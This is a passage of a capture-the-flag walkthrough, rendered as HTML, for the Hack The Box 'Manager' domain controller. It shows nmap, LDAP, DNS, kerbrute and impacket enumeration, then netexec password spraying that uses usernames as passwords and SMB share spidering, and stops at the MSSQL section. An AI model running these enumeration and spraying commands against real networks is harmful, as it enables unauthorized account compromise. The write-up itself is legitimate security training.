@@ -1,0 +1,1783 @@
+<!DOCTYPE html>
+<html lang="en-us">
+    <head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
+    <meta charset="utf-8" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
+    <meta name="viewport" content="width=device-width, initial-scale=1" />
+
+    <meta name="generator" content="Hugo 0.134.3">
+
+    
+
+    
+
+    
+        
+            <meta
+                name="description"
+                content="Saucy Monk" />
+        
+
+        
+            <meta
+                name="keywords"
+                content="hacking, AD" />
+        
+
+        
+            <meta name="author" content="bloodstiller" />
+        
+
+    
+
+
+    <title>
+        
+            HTB Manager Walkthrough |
+            Hack the planet
+        
+    </title>
+
+    
+
+
+    
+    
+
+    
+    
+
+
+    
+    
+
+
+    
+    
+
+
+    
+    
+
+    
+
+
+    
+    
+
+    
+
+    
+
+        
+            
+            <link
+                rel="stylesheet"
+                href="/reset.min_6107201571472815285.3662e40c85350bf0bcf308b7db81c173e4b690b862d3c3cde460de5155550bf055b7ff48cddb1cf5255e55f0355196d8dec1d49434b2457842cc77ebea198f3f.css"
+                integrity="sha512-NmLkDIU1C/C88wi324HBc&#43;S2kLhi08PN5GDeUVVVC/BVt/9Izdsc9SVeVfA1UZbY3sHUlDSyRXhCzHfr6hmPPw==" />
+        
+            
+            <link
+                rel="stylesheet"
+                href="/_theme/css/01_layout.5974c097ff194e0a64d31c28fc478cc38b6290fe28d2cc2dbf5ae52a66751db74e4e7374bc4e25f464ea679f74cd86c474a5367e05c2db34a1b9b273466691e0.css"
+                integrity="sha512-WXTAl/8ZTgpk0xwo/EeMw4tikP4o0swtv1rlKmZ1HbdOTnN0vE4l9GTqZ590zYbEdKU2fgXC2zShubJzRmaR4A==" />
+        
+            
+            <link
+                rel="stylesheet"
+                href="/_theme/css/02_style.14999effaf83975f470e4d3e303980c69c3fa22af206ac8a2b8194c4fa45a3b3f3fe890a9c8ebee433b59644c91e8a3c2e1d08759ef714f7c58740476202b2e4.css"
+                integrity="sha512-FJme/6&#43;Dl19HDk0&#43;MDmAxpw/oiryBqyKK4GUxPpFo7Pz/okKnI6&#43;5DO1lkTJHoo8Lh0IdZ73FPfFh0BHYgKy5A==" />
+        
+            
+            <link
+                rel="stylesheet"
+                href="/_theme/css/03_home.6d64455a82e28b01e58f3c37541add9e36fc8ed87562dac91ff06da3f7f11b32ac1cacaa593b2ab2e01acd894659f66c249bd0a261f051038f19a8734c3e1243.css"
+                integrity="sha512-bWRFWoLiiwHljzw3VBrdnjb8jth1YtrJH/Bto/fxGzKsHKyqWTsqsuAazYlGWfZsJJvQomHwUQOPGahzTD4SQw==" />
+        
+            
+            <link
+                rel="stylesheet"
+                href="/_theme/css/04_responsive.065451199c1e1cd4f86ac1c8733e3c77eaf215b4972cefff7e7929a2837f5b2cc0e0a04f99f34d58e082812d6102c8cc9b358d21db784e9c4d5e5a8c79f4bc43.css"
+                integrity="sha512-BlRRGZweHNT4asHIcz48d&#43;ryFbSXLO//fnkpooN/WyzA4KBPmfNNWOCCgS1hAsjMmzWNIdt4TpxNXlqMefS8Qw==" />
+        
+            
+            <link
+                rel="stylesheet"
+                href="/_theme/css/05_markdown.de2662953e910d823800463c9997c741238e5f59d4d253e9472d9fc0bf3c9faf106b5b475064647243977e5bbe309455540c18d173a69e917fe7dce74e814a52.css"
+                integrity="sha512-3iZilT6RDYI4AEY8mZfHQSOOX1nU0lPpRy2fwL88n68Qa1tHUGRkckOXflu&#43;MJRVVAwY0XOmnpF/59znToFKUg==" />
+        
+
+    
+
+
+    
+    
+
+    
+
+    
+
+    
+
+    
+</head>
+
+
+
+    <body>
+        <header class="header">
+    <div class="header_left">
+        
+    </div>
+
+    <div class="header_middle">
+        
+            HTB Manager Walkthrough -
+            Hack the planet
+        
+    </div>
+</header>
+
+
+
+        <main>
+            <aside class="sidebar">
+    
+
+
+
+    
+    
+
+    
+    
+
+
+    <ul class="section-tree">
+        
+            
+                <li
+                    
+                        class="dir closed-dir"
+                    >
+                    <span class="dir-text"> Walkthroughs </span>
+
+                    
+
+
+
+    
+    
+
+    
+    
+
+
+    <ul class="section-tree">
+        
+            
+                <li class="file">
+                    <a href="http://localhost:1313/walkthroughs/access-box/" title="./walkthroughs/access-box/">
+                        
+                            Access HTB Walkthrough
+                        
+                    </a>
+                </li>
+            
+        
+            
+                <li class="file">
+                    <a href="http://localhost:1313/walkthroughs/remote-box/" title="./walkthroughs/remote-box/">
+                        
+                            Remote HTB Walkthrough
+                        
+                    </a>
+                </li>
+            
+        
+            
+                <li class="file">
+                    <a href="http://localhost:1313/walkthroughs/return-box/" title="./walkthroughs/return-box/">
+                        
+                            Return HTB Box Walkthrough
+                        
+                    </a>
+                </li>
+            
+        
+            
+                <li class="file">
+                    <a href="http://localhost:1313/walkthroughs/support-box/" title="./walkthroughs/support-box/">
+                        
+                            Support HTB Walkthrough
+                        
+                    </a>
+                </li>
+            
+        
+    </ul>
+
+
+                </li>
+            
+        
+            
+                <li class="file">
+                    <a href="http://localhost:1313/manager-box/" title="./manager-box/">
+                        
+                            HTB Manager Walkthrough
+                        
+                    </a>
+                </li>
+            
+        
+            
+                <li class="file">
+                    <a href="http://localhost:1313/orgtest/" title="./orgtest/">
+                        
+                            org-test
+                        
+                    </a>
+                </li>
+            
+        
+    </ul>
+
+
+</aside>
+<aside class="exapandable"></aside>
+
+
+            
+    <article class="main">
+        <button
+    class="sidebar-toggle-btn"
+    type="menu"
+    aria-expanded="false"
+    aria-haspopup="true">
+    <i class="bi bi-list"></i>
+</button>
+
+
+
+        <div class="title">
+            <h1 class="title-header">
+                HTB Manager Walkthrough
+            </h1>
+
+            <div class="author-date-readtime">
+                
+
+                    
+                        <div class="author" title="Author">
+                            <i class="bi bi-person"></i>
+                            <a
+                                href="/author/bloodstiller/"
+                                class="cat-btn">
+                                bloodstiller
+                            </a>
+                        </div>
+                    
+
+                
+
+                
+                    <div class="date" title="Date">
+                        <i class="bi bi-calendar3"></i>
+                        <time
+                            datetime="0001.01.01"
+                            >0001.01.01
+                        </time>
+                    </div>
+                
+
+                
+                    <div
+                        class="readtime"
+                        title="Time to Read">
+                        <i class="bi bi-clock"></i>
+                        18 mins to read
+                    </div>
+                
+            </div>
+        </div>
+
+        <div class="article-meta">
+            
+
+            
+                <div class="tags">
+                    <i
+                        class="bi bi-tags"
+                        title="Tags"></i>
+                    
+                        <a
+                            href="/tags/box/"
+                            class="tag-btn">
+                            Box
+                        </a>
+                    
+                        <a
+                            href="/tags/htb/"
+                            class="tag-btn">
+                            HTB
+                        </a>
+                    
+                        <a
+                            href="/tags/easy/"
+                            class="tag-btn">
+                            Easy
+                        </a>
+                    
+                        <a
+                            href="/tags/windows/"
+                            class="tag-btn">
+                            Windows
+                        </a>
+                    
+                        <a
+                            href="/tags/ldap/"
+                            class="tag-btn">
+                            LDAP
+                        </a>
+                    
+                        <a
+                            href="/tags/kerberos/"
+                            class="tag-btn">
+                            kerberos
+                        </a>
+                    
+                        <a
+                            href="/tags/smb/"
+                            class="tag-btn">
+                            SMB
+                        </a>
+                    
+                </div>
+            
+
+            
+                <div class="breadcumb">
+                    <i class="bi bi-folder"></i>
+                    
+    
+
+
+
+
+<a href="http://localhost:1313/" class="bread-btn">
+    
+        <i class="bi bi-house-fill"></i>
+    
+
+    
+        Home
+    
+</a>
+
+
+
+
+    /
+
+
+
+<a href="http://localhost:1313/manager-box/" class="bread-btn">
+    
+
+    
+        
+            HTB Manager Walkthrough
+        
+
+    
+</a>
+
+                </div>
+            
+
+            
+        </div>
+
+        
+            <nav id="TableOfContents">
+  <ul>
+    <li><a href="#name-of-box-manager">Name of box: - Manager</a></li>
+    <li><a href="#1-dot-enumeration">1. Enumeration:</a>
+      <ul>
+        <li><a href="#nmap">NMAP:</a></li>
+        <li><a href="#web-80">Web <code>80</code>:</a></li>
+        <li><a href="#smb-445">SMB <code>445</code>:</a></li>
+        <li><a href="#ldap-389">LDAP <code>389</code>:</a></li>
+        <li><a href="#dns-53">DNS <code>53</code>:</a></li>
+        <li><a href="#kerberos-88">Kerberos <code>88</code>:</a></li>
+        <li><a href="#making-a-list-and-x2026-dot-checking-it-once">Making a list….checking it once?:</a></li>
+      </ul>
+    </li>
+    <li><a href="#2-dot-foothold">2. Foothold:</a>
+      <ul>
+        <li><a href="#credentialed-smb-enumeration">Credentialed SMB Enumeration:</a></li>
+        <li><a href="#credentials-mssql-enumeration">Credentials MSSQL Enumeration:</a></li>
+        <li><a href="#finding-hard-coded-credentials">Finding Hard-coded Credentials:</a></li>
+        <li><a href="#getting-access-to-the-system-as-raven">Getting access to the system as Raven:</a></li>
+      </ul>
+    </li>
+    <li><a href="#3-dot-privilege-escalation">3. Privilege Escalation:</a>
+      <ul>
+        <li><a href="#privesc-enumeration">Privesc Enumeration:</a></li>
+        <li><a href="#ca-abuse-to-privesc">CA Abuse to Privesc:</a></li>
+        <li><a href="#attack-deep-dive-e-dot-g-dot-exploiting-upns-in-esc7-attacks-a-hacker-s-guide">Attack Deep-Dive e.g. Exploiting UPNs in ESC7 Attacks: A Hacker&rsquo;s Guide:</a></li>
+      </ul>
+    </li>
+    <li><a href="#4-dot-ownership">4. Ownership:</a></li>
+    <li><a href="#5-dot-persistence">5. Persistence:</a>
+      <ul>
+        <li><a href="#process-of-failed-golden-ticket-attack">Process of failed Golden Ticket Attack:</a></li>
+      </ul>
+    </li>
+    <li><a href="#lessons-learned">Lessons Learned:</a>
+      <ul>
+        <li><a href="#what-did-i-learn">What did I learn?</a></li>
+        <li><a href="#what-silly-mistakes-did-i-make">What silly mistakes did I make?</a></li>
+      </ul>
+    </li>
+    <li><a href="#sign-off">Sign off:</a></li>
+  </ul>
+</nav>
+        
+
+
+        <div class="content">
+            
+                <h2 id="name-of-box-manager">Name of box: - Manager</h2>
+<h2 id="1-dot-enumeration">1. Enumeration:</h2>
+<h3 id="nmap">NMAP:</h3>
+<ul>
+<li>
+<p><strong>Basic Scan</strong>:</p>
+<ul>
+<li><code>nmap $box -Pn -oA basicScan</code>
+
+
+
+
+
+
+
+<div class="codeblock">
+    
+        <div class="copy-button-box">
+            <button class="copy-button" state="copy" data="#ZgotmplZ">
+                <i class="bi bi-copy"></i>
+            </button>
+        </div>
+    
+
+    
+        <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>  Host is up <span style="color:#f92672">(</span>0.040s latency<span style="color:#f92672">)</span>.
+</span></span><span style="display:flex;"><span>  Not shown: <span style="color:#ae81ff">987</span> filtered tcp ports <span style="color:#f92672">(</span>no-response<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>  PORT     STATE SERVICE
+</span></span><span style="display:flex;"><span>  53/tcp   open  domain
+</span></span><span style="display:flex;"><span>  80/tcp   open  http
+</span></span><span style="display:flex;"><span>  88/tcp   open  kerberos-sec
+</span></span><span style="display:flex;"><span>  135/tcp  open  msrpc
+</span></span><span style="display:flex;"><span>  139/tcp  open  netbios-ssn
+</span></span><span style="display:flex;"><span>  389/tcp  open  ldap
+</span></span><span style="display:flex;"><span>  445/tcp  open  microsoft-ds
+</span></span><span style="display:flex;"><span>  464/tcp  open  kpasswd5
+</span></span><span style="display:flex;"><span>  593/tcp  open  http-rpc-epmap
+</span></span><span style="display:flex;"><span>  636/tcp  open  ldapssl
+</span></span><span style="display:flex;"><span>  1433/tcp open  ms-sql-s
+</span></span><span style="display:flex;"><span>  3268/tcp open  globalcatLDAP
+</span></span><span style="display:flex;"><span>  3269/tcp open  globalcatLDAPssl</span></span></code></pre></div>
+    
+</div>
+</li>
+</ul>
+</li>
+<li>
+<p>This scan already gives us a lot to go off of.</p>
+<ul>
+<li>We can see that numerous services are running:
+<ul>
+<li>What is telling is that port <code>53</code> is running, which means this host is running it&rsquo;s own DNS service, which would indicate that it&rsquo;s running as a server or even a DC. We can also see that it&rsquo;s running <code>88</code> kerberos &amp; <code>389,3268,3269</code> ldap/ldapssl which again indicates it&rsquo;s a server/DC. We also have <code>1433</code> MSSQL running. Lots of interesting things.</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>
+<p><strong>In depth scan</strong>:</p>
+<ul>
+<li><code>sudo nmap -p- -sV -sC -O -Pn --disable-arp-ping $box -oA FullTCP</code></li>
+<li><figure><img src="/ox-hugo/2024-09-20-201131_.png">
+</figure>
+</li>
+<li>We can see the host is called <code>DC01</code> which lets us know this is a high-value target as it&rsquo;s a domain controller.</li>
+</ul>
+</li>
+</ul>
+<h3 id="web-80">Web <code>80</code>:</h3>
+<ul>
+<li>
+<p>Looking at the website, it appears to be running a content writing service:</p>
+<ul>
+<li><figure><img src="/ox-hugo/2024-09-20-201811_.png">
+</figure>
+</li>
+</ul>
+</li>
+<li>
+<p>Wappalyzer doesn&rsquo;t give any additional information regarding the underlying software stack being used.</p>
+<ul>
+<li><figure><img src="/ox-hugo/2024-09-20-200932_.png">
+</figure>
+</li>
+</ul>
+</li>
+<li>
+<p>I check the &ldquo;contact&rdquo; page for injection as it has a submission form:</p>
+<ul>
+<li><figure><img src="/ox-hugo/2024-09-20-202029_.png">
+</figure>
+</li>
+<li>However it does not appear to be injectable:
+<ul>
+<li><figure><img src="/ox-hugo/2024-09-20-202250_.png">
+</figure>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>
+<p>I perform some dirbusting with little to no results:</p>
+<ul>
+<li><figure><img src="/ox-hugo/2024-09-20-205837_.png">
+</figure>
+</li>
+</ul>
+</li>
+</ul>
+<!-- raw HTML omitted -->
+<ul>
+<li>Tip, as soon as you start investigating any websites, ALWAYS proxy them through burp straight away. This way as you are working your way around the site looking for injection points and seeing how the site works and reacts to input you have a log already running.</li>
+</ul>
+<h3 id="smb-445">SMB <code>445</code>:</h3>
+<ul>
+<li>
+<p>SMB appears to allow us to login via the guest account:</p>
+<ul>
+<li><figure><img src="/ox-hugo/2024-09-20-202838_.png">
+</figure>
+</li>
+</ul>
+</li>
+<li>
+<p>There are a number of shares running, but we only have read access to the <code>IPC$</code> share:</p>
+<ul>
+<li><figure><img src="/ox-hugo/2024-09-20-202937_.png">
+</figure>
+</li>
+</ul>
+</li>
+<li>
+<p>As expected there is nothing in it:</p>
+<ul>
+<li><figure><img src="/ox-hugo/2024-09-20-203129_.png">
+</figure>
+</li>
+</ul>
+</li>
+</ul>
+<h4 id="over-view-of-ipc-share">Over view of <code>IPC$</code> Share:</h4>
+<ul>
+<li><strong>Quick overview if you are unfamiliar with the <code>IPC$</code> share</strong>:
+<ul>
+<li>The <code>IPC$</code> share (<code>Inter-Process Communication</code>) is a special administrative share in Windows which allows communication with programs via Named Pipes:
+<ul>
+<li>It&rsquo;s mainly used for inter-process communication between hosts over a network.</li>
+<li>It also enables remote administration of a system, allowing file and print sharing.</li>
+<li>It&rsquo;s a default share on windows systems.</li>
+<li>Requires credentials for access, typically used in conjunction with administrative or user rights.
+<ul>
+<li>But as you can see <code>Guest</code> creds can also work in some instances.</li>
+</ul>
+</li>
+<li>It is possible to use <code>IPC$</code> for enumeration (e.g., enumerating users, shares, groups or services).</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+<h3 id="ldap-389">LDAP <code>389</code>:</h3>
+<ul>
+<li>
+<p><strong>Using LDAP anonymous bind to enumerate further</strong>:</p>
+<ul>
+<li>If you are unsure of what anonymous bind does. It enables us to query for domain information anonymously, e.g. without passing credentials.
+<ul>
+<li>We can actually retrieve a significant amount of information via anonymous bind such as:
+<ul>
+<li>A list of all users</li>
+<li>A list of all groups</li>
+<li>A list of all computers.</li>
+<li>User account attributes.</li>
+<li>The domain password policy.</li>
+<li>Enumerate users who are susceptible to AS-REPRoasting.</li>
+<li>Passwords stored in the description fields</li>
+</ul>
+</li>
+<li>The added benefit of using ldap to perform these queries is that these are most likely not going to trigger any sort of AV etc as ldap is how AD communicates.</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>
+<p>I actually have a handy script to check if anonymous bind is enabled &amp; if it is to dump a large amount of information. You can find it here</p>
+<ul>
+<li><a href="https://github.com/bloodstiller/ldapchecker">https://github.com/bloodstiller/ldapchecker</a></li>
+</ul>
+</li>
+<li>
+<p>It turns out the anonymous bind is enabled and we get the below information. I have removed the majority of the information as it is not relevant, however there are some keys bits of information we can use moving forward.</p>
+<ol>
+<li>
+<p><!-- raw HTML omitted -->We have the naming context of the domain<!-- raw HTML omitted -->:</p>
+
+
+
+
+
+
+
+<div class="codeblock">
+    
+        <div class="copy-button-box">
+            <button class="copy-button" state="copy" data="kali%20in%20~/Desktop/WindowsTools%20%f0%9f%90%8d%20v3.11.9%20%204GiB/7GiB%20%7c%20780kiB/1GiB%20with%20/usr/bin/zsh%0a%f0%9f%95%99%2020:42:31%20zsh%20%e2%9d%af%20python3%20ldapchecker.py%20$box%0aAttempting%20to%20connect%20to%2010.129.188.216%20with%20SSL...%0aConnected%20successfully.%20Retrieving%20server%20information...%0aDSA%20info%20%28from%20DSE%29:%0a%20%20Supported%20LDAP%20versions:%203,%202%0a%20%20Naming%20contexts:%0a%20%20%20%20DC=manager,DC=htb%0a%20%20%20%20CN=Configuration,DC=manager,DC=htb%0a%20%20%20%20CN=Schema,CN=Configuration,DC=manager,DC=htb%0a%20%20%20%20DC=DomainDnsZones,DC=manager,DC=htb%0a%20%20%20%20DC=ForestDnsZones,DC=manager,DC=htb">
+                <i class="bi bi-copy"></i>
+            </button>
+        </div>
+    
+
+    
+        <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>kali in ~/Desktop/WindowsTools 🐍 v3.11.9  4GiB/7GiB | 780kiB/1GiB with /usr/bin/zsh
+</span></span><span style="display:flex;"><span>🕙 20:42:31 zsh ❯ python3 ldapchecker.py $box
+</span></span><span style="display:flex;"><span>Attempting to connect to 10.129.188.216 with SSL...
+</span></span><span style="display:flex;"><span>Connected successfully. Retrieving server information...
+</span></span><span style="display:flex;"><span>DSA info <span style="color:#f92672">(</span>from DSE<span style="color:#f92672">)</span>:
+</span></span><span style="display:flex;"><span>  Supported LDAP versions: 3, <span style="color:#ae81ff">2</span>
+</span></span><span style="display:flex;"><span>  Naming contexts:
+</span></span><span style="display:flex;"><span>    DC<span style="color:#f92672">=</span>manager,DC<span style="color:#f92672">=</span>htb
+</span></span><span style="display:flex;"><span>    CN<span style="color:#f92672">=</span>Configuration,DC<span style="color:#f92672">=</span>manager,DC<span style="color:#f92672">=</span>htb
+</span></span><span style="display:flex;"><span>    CN<span style="color:#f92672">=</span>Schema,CN<span style="color:#f92672">=</span>Configuration,DC<span style="color:#f92672">=</span>manager,DC<span style="color:#f92672">=</span>htb
+</span></span><span style="display:flex;"><span>    DC<span style="color:#f92672">=</span>DomainDnsZones,DC<span style="color:#f92672">=</span>manager,DC<span style="color:#f92672">=</span>htb
+</span></span><span style="display:flex;"><span>    DC<span style="color:#f92672">=</span>ForestDnsZones,DC<span style="color:#f92672">=</span>manager,DC<span style="color:#f92672">=</span>htb</span></span></code></pre></div>
+    
+</div>
+</li>
+<li>
+<p><!-- raw HTML omitted -->We have the domain functionaility level<!-- raw HTML omitted -->:</p>
+
+
+
+
+
+
+
+<div class="codeblock">
+    
+        <div class="copy-button-box">
+            <button class="copy-button" state="copy" data="#ZgotmplZ">
+                <i class="bi bi-copy"></i>
+            </button>
+        </div>
+    
+
+    
+        <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>Other:
+</span></span><span style="display:flex;"><span>  domainFunctionality:
+</span></span><span style="display:flex;"><span>    <span style="color:#ae81ff">7</span>
+</span></span><span style="display:flex;"><span>  forestFunctionality:
+</span></span><span style="display:flex;"><span>    <span style="color:#ae81ff">7</span>
+</span></span><span style="display:flex;"><span>  domainControllerFunctionality:
+</span></span><span style="display:flex;"><span>    <span style="color:#ae81ff">7</span>
+</span></span><span style="display:flex;"><span>  rootDomainNamingContext:
+</span></span><span style="display:flex;"><span>    DC<span style="color:#f92672">=</span>manager,DC<span style="color:#f92672">=</span>htb
+</span></span><span style="display:flex;"><span>  ldapServiceName:
+</span></span><span style="display:flex;"><span>    manager.htb:dc01$@MANAGER.HTB</span></span></code></pre></div>
+    
+</div>
+<ul>
+<li>The functionality level determines the minimum version of Windows server that can be used for a DC.
+<ul>
+<li>
+<p>Note that any host os can used on <strong>workstations</strong>, however the functionality level determines what the minimum version for DC&rsquo;s and the forest.</p>
+</li>
+<li>
+<p><a href="https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/active-directory-functional-levels">https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/active-directory-functional-levels</a></p>
+</li>
+<li>
+<p>Knowing the function level is useful as if want to target the DC&rsquo;s and servers, we can know by looking at the function level what the minimum level of OS would be.</p>
+</li>
+<li>
+<p>In this case we can see it is level 7 which means that this server has to be running Windows Server 2016 or newer.</p>
+</li>
+<li>
+<p>Here’s a list of functional level numbers and their corresponding Windows Server operating systems:</p>
+<table>
+  <thead>
+      <tr>
+          <th style="text-align: left">Functional Level Number</th>
+          <th style="text-align: left">Corresponding OS</th>
+      </tr>
+  </thead>
+  <tbody>
+      <tr>
+          <td style="text-align: left">0</td>
+          <td style="text-align: left">Windows 2000</td>
+      </tr>
+      <tr>
+          <td style="text-align: left">1</td>
+          <td style="text-align: left">Windows Server 2003 Interim</td>
+      </tr>
+      <tr>
+          <td style="text-align: left">2</td>
+          <td style="text-align: left">Windows Server 2003</td>
+      </tr>
+      <tr>
+          <td style="text-align: left">3</td>
+          <td style="text-align: left">Windows Server 2008</td>
+      </tr>
+      <tr>
+          <td style="text-align: left">4</td>
+          <td style="text-align: left">Windows Server 2008 R2</td>
+      </tr>
+      <tr>
+          <td style="text-align: left">5</td>
+          <td style="text-align: left">Windows Server 2012</td>
+      </tr>
+      <tr>
+          <td style="text-align: left">6</td>
+          <td style="text-align: left">Windows Server 2012 R2</td>
+      </tr>
+      <tr>
+          <td style="text-align: left">7</td>
+          <td style="text-align: left">Windows Server 2016</td>
+      </tr>
+      <tr>
+          <td style="text-align: left">8</td>
+          <td style="text-align: left">Windows Server 2019</td>
+      </tr>
+      <tr>
+          <td style="text-align: left">9</td>
+          <td style="text-align: left">Windows Server 2022</td>
+      </tr>
+  </tbody>
+</table>
+<ul>
+<li>Note:
+<ul>
+<li>Each number corresponds to the minimum Windows Server version required for domain controllers in the domain or forest.</li>
+<li>As the functional level increases, additional Active Directory features become available, but older versions of Windows Server may not be supported as domain controllers.</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>
+<p><!-- raw HTML omitted -->We have the full server name<!-- raw HTML omitted -->:</p>
+<ul>
+<li>Again we can see this has the CN as the base (mentioned previously.) So it appears it&rsquo;s a printer server site of some sort. What is also interesting is the CN name &ldquo;Configuration&rdquo;, this could imply that it is still to be configured. Which is interesting as things that are still being configured may not have had thorough security standards actioned.
+
+
+
+
+
+
+
+<div class="codeblock">
+    
+        <div class="copy-button-box">
+            <button class="copy-button" state="copy" data="#ZgotmplZ">
+                <i class="bi bi-copy"></i>
+            </button>
+        </div>
+    
+
+    
+        <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span> serverName:
+</span></span><span style="display:flex;"><span>    CN<span style="color:#f92672">=</span>DC01,CN<span style="color:#f92672">=</span>Servers,CN<span style="color:#f92672">=</span>Default-First-Site-Name,CN<span style="color:#f92672">=</span>Sites,CN<span style="color:#f92672">=</span>Configuration,DC<span style="color:#f92672">=</span>manager,DC<span style="color:#f92672">=</span>htb</span></span></code></pre></div>
+    
+</div>
+</li>
+</ul>
+</li>
+</ol>
+</li>
+<li>
+<p>It&rsquo;s pretty amazing already what we have learned just by running some fairly simple ldap queries.</p>
+<ul>
+<li>We have the naming context.</li>
+<li>Domain name.</li>
+</ul>
+</li>
+</ul>
+<h3 id="dns-53">DNS <code>53</code>:</h3>
+<ul>
+<li>I run DNSenum on the host to find out if there are any interesting entries:
+<ul>
+<li><code>dnsenum -r --dnsserver $box --enum -p 0 -s 0 -f ~/Seclists/Discovery/DNS/subdomains-top1million-110000.txt manager.htb</code></li>
+</ul>
+</li>
+<li>Unfortunately I get very little from this bar the standard DNS entries present on DC&rsquo;s by default:</li>
+<li><figure><img src="/ox-hugo/2024-09-20-210200_.png">
+</figure>
+
+<ul>
+<li><code>domaindnszones.manager.htb</code>: Stores DNS records replicated across all domain controllers in the domain.</li>
+<li><code>forestdnszones.manager.htb</code>: Stores DNS records replicated across all domain controllers in the forest.</li>
+<li><code>gc._msdcs.manager.htb</code>: Used to locate Global Catalog servers for cross-domain queries and authentication.</li>
+</ul>
+</li>
+</ul>
+<h3 id="kerberos-88">Kerberos <code>88</code>:</h3>
+<ul>
+<li>
+<p><strong>As kerberos is open we can also enumerate users, groups and some other information</strong>:</p>
+</li>
+<li>
+<p>I spin up <a href="https://github.com/ropnop/kerbrute">Kerbrute</a> and pass it a username list from <a href="https://github.com/danielmiessler/SecLists">seclists</a>:</p>
+<ul>
+<li>
+<p><code>kerbrute userenum -d manager.htb --dc $box ~/Wordlists/seclists/Usernames/xato-net-10-million-usernames.txt</code></p>
+</li>
+<li>
+<figure><img src="/ox-hugo/2024-09-21-074049_.png">
+</figure>
+
+</li>
+</ul>
+</li>
+<li>
+<p>I use the <a href="https://github.com/fortra/impacket/blob/master/examples/lookupsid.py">impacket-lookupsid</a> module to further enumerate groups, users &amp; machine accounts:</p>
+<ul>
+<li><code>impacket-lookupsid manager.htb/guest@dc01.manager.htb -domain-sids</code></li>
+<li><figure><img src="/ox-hugo/2024-09-21-074255_.png">
+</figure>
+
+<ul>
+<li><strong>We find some interesting things here</strong>:
+<ol>
+<li>Standard User accounts built into any DC.</li>
+<li>Machine account <code>DC01$</code>.
+<ul>
+<li>All machine accounts are followed by the <code>$</code> symbol</li>
+</ul>
+</li>
+<li>Groups.</li>
+<li>Non default user accounts.
+<ul>
+<li>You may also notice that the user <code>ChinHae</code> did not show up in <code>kerbrute</code> this is due to us using brute-forcing to enumerate users in <code>kerbrute</code> where-as with this module we are actively querying the DC for this information.</li>
+</ul>
+</li>
+</ol>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+<h3 id="making-a-list-and-x2026-dot-checking-it-once">Making a list….checking it once?:</h3>
+<ul>
+<li>There does not seem to be anything obvious and low-hanging that is exploitable. So I am going to try some password spraying, using the users name as their password.
+<ul>
+<li>If this does not work I will then crawl the site using <a href="https://github.com/digininja/CeWL">CeWL</a> to generate a custom password list.</li>
+</ul>
+</li>
+<li>I create a password list from their usernames, to avoid complexity I have made all passwords lower-case.
+<ul>
+<li><code>netexec smb $box -u Users.txt -p Passwords.txt --no-bruteforce</code>
+<ul>
+<li>As I currently do not know the password policy (I tried enumerating it but the <code>guest</code> account would not allow me to, nor would LDAP) I used the <code>--no-bruteforce</code> flag which means it will not try all combinations.</li>
+</ul>
+</li>
+<li><strong>I get a hit!</strong>
+<ul>
+<li><figure><img src="/ox-hugo/2024-09-21-143127_.png">
+</figure>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+<h2 id="2-dot-foothold">2. Foothold:</h2>
+<h3 id="credentialed-smb-enumeration">Credentialed SMB Enumeration:</h3>
+<p>I check if we have access to more smb shares with the creds &amp; we do:</p>
+<ul>
+<li>
+<figure><img src="/ox-hugo/2024-09-21-143649_.png">
+</figure>
+
+</li>
+<li>
+<p>Often the SYSVOL share will be used to hold scripts on a DC so this is a good target to go after.</p>
+</li>
+<li>
+<p><strong>SMBClient</strong>:</p>
+<ul>
+<li>I check both shares and we cannot list the contents of them:
+<ul>
+<li><code>smbclient -U '$user'  &quot;\\\\$box\\SYSVOL&quot;</code></li>
+<li><code>smbclient -U '$user'  &quot;\\\\$box\\NETLOGON&quot;</code></li>
+<li><figure><img src="/ox-hugo/2024-09-21-143934_.png">
+</figure>
+
+<ul>
+<li>See future bloodstiller note below for why this did not work, it was my syntax!!!</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>
+<p><strong>SMBMAP</strong>:</p>
+<ul>
+<li>To ensure I am not getting false positives from my tools I also try SMBMAP:
+<ul>
+<li><code>smbmap -u '$user' -p '$user' -H $box -r</code></li>
+<li><figure><img src="/ox-hugo/2024-09-21-144057_.png">
+</figure>
+</li>
+<li><strong>Future Bloodstiller here</strong>:
+<ul>
+<li>This didn&rsquo;t work as I had enclosed my alias&rsquo; in quotations it should have been <code>$user</code> not <code>$user</code> and it would have listed the contents of the shares. However I still did not have access to read items within.</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>
+<p><strong>Netexec Spidering</strong>:</p>
+<ul>
+<li>I try one more tool, netexec and use it to spider,
+<ul>
+<li><code>netexec smb $box -u $user -p $user -M spider_plus -o EXCLUDE_DIR=IPC$</code></li>
+<li>We can see from the results that there are files &amp; shares available. I have excluded the <code>IPC$</code> share from this process as although privesc is possible using this share it&rsquo;s most probably unlikely due to the complexity of the attack &amp; this is a medium rated box. Which means there are files here it just may be that our current user does not have access to them.</li>
+<li><figure><img src="/ox-hugo/2024-09-21-144457_.png">
+</figure>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+<h3 id="credentials-mssql-enumeration">Credentials MSSQL Enumeration:</h3>
+<ul>
